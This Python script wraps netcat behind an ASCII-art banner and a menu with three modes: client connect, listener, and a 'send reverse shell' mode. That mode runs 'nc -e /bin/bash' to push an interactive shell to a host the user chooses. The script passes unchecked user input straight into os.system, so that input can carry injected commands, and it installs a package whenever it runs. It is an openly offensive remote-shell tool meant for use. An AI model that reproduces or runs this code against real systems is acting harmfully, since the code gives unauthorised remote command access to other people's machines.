#!/usr/bin/python3

# Copyright 2019, Aniket.N.Bhagwate, All rights reserved.
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE.
#libraries
import os
os.system("pip install colorama==0.3.3")
from colorama import Fore, Back, Style
os.system("clear")
print(Fore.GREEN + Style.BRIGHT + "") 
print("--------------------------------------------------------")
print("__        _   _ _____ _____ ____    _  _____        __  ")
print("| _|_/\__ | \ | | ____|_   _/ ___|  / \|_   _| __/\_|_ |")
print("| |\    / |  \| |  _|   | || |     / _ \ | |   \    /| |")
print("| |/_  _\ | |\  | |___  | || |___ / ___ \| |   /_  _\| |")
print("| |  \/   |_| \_|_____| |_| \____/_/   \_\_|     \/  | |")
print("|__|                                                |__|")
print("		----------------------------------------------------")
print(Fore.RED + Style.BRIGHT + "")
print("                         [ ~ #Code By: Aniket.N.Bhagwate]")
print(Fore.GREEN + Style.BRIGHT + "")
print("		----------------------------------------------------")
print("[*] 1: CLIENT --> CONNECT TO HOST")
print("[*] 2: SERVER --> LISTEN FOR CONNECTIONS")
print("[*] 3: SEND REVERSE SHELL")
choice = input("NETCAT : ")



def client():
    print("[*] CLIENT MODULE")
    ip_address = input("[*] ENTER THE DESTINATION IP ADDRESS : ")
    port = input("[*] ENTER THE DESTINATION PORT : ")
    print("[*] ESTABLISHING CONNECTION TO [ {} ] on PORT [ {} ]".format(ip_address,port))
    os.system("nc -nv {} {}".format(ip_address,port))
    

def server():
    print("[*] SERVER MODULE")
    port = input("[*] ENTER PORT TO LISTEN ON : ")
    os.system("nc -l -vv -p {}".format(port))


def reverse():
    print("[*] REVERSE SHELL MODULE")
    ip_address = input("[*] ENTER THE DESTINATION IP ADDRESS : ")
    port = input("[*] ENTER THE DESTINATION PORT : ")
    print("[*] SENDING SHELL TO [ {} ] on PORT [ {} ]".format(ip_address,port))
    os.system("nc -nv {} {} -e /bin/bash".format(ip_address,port))



if choice =='1':
    client()

elif choice =='2':
    server()
    
elif choice =='3':
    reverse()
